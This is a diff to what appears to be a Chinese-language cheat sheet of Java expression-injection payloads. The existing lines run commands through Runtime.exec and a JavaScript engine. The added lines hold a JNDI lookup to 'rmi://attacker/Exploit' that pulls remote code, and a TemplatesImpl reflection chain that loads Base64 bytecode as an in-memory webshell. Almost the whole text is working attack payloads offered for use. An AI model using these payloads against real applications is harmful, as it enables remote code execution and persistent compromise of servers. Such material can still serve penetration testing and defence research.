@@ -54,7 +54,25 @@ processor.eval("user.name")
 T(java.lang.Runtime).getRuntime().exec(\"calc\").getInputStream()
 ```
 
+```java
+T(javax.naming.InitialContext).newInstance().lookup('rmi://attacker/Exploit')
+```
+
+加载内存马
+
+```text
+(#t = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl(),
+ #f = #t.getClass().getDeclaredField('_bytecodes'), #f.setAccessible(true),
+ #f.set(#t, new byte[][]{T(java.util.Base64).getDecoder().decode('<Evil的base64字节码>')}),
+ #f2 = #t.getClass().getDeclaredField('_name'), #f2.setAccessible(true), #f2.set(#t, 'a'),
+ #f3 = #t.getClass().getDeclaredField('_tfactory'), #f3.setAccessible(true),
+ #f3.set(#t, new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl()),
+ #t.newTransformer()).getClass()
+
+```
+
 ## new
+
 ```
 new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\")
 ```
